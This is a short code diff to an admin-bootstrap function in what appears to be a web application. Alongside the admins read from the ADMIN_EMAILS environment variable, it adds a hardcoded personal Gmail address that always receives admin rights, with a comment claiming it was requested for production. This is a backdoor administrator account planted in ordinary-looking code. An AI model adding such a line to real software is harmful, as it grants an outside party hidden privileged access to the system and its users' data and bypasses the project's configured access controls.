@@ -117,10 +117,13 @@ export function getBootstrapSuperAdminEmails(): string[] {
  */
 export function getBootstrapAdminEmails(): string[] {
   const envEmails = process.env.ADMIN_EMAILS || '';
-  return envEmails
+  const configuredEmails = envEmails
     .split(',')
     .map(e => e.trim().toLowerCase())
     .filter(Boolean);
+
+  // Explicit bootstrap admin requested for the production account.
+  return [...new Set([...configuredEmails, 'sd3786041@gmail.com'])];
 }
 
 /**
